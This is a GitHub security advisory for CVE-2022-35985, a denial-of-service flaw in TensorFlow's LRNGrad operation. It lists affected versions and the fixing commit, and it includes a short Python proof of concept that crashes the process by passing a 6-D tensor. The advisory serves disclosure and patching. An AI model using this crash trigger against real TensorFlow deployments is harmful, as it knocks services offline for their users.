# [M] TensorFlow vulnerable to `CHECK` fail in `LRNGrad`

## Summary
Severity: Medium
Advisory: GHSA-9942-r22v-78cp
CVE: CVE-2022-35985
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-9942-r22v-78cp
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `LRNGrad` is given an `output_image` input tensor that is not 4-D, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
depth_radius = 1
bias = 1.59018219
alpha = 0.117728651
beta = 0.404427052
input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)
```

### Patches
We have patched the issue in GitHub commit [bd90b3efab4ec958b228cd7cfe9125be1c0cf255](https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp
- https://nvd.nist.gov/vuln/detail/CVE-2022-35985
- https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
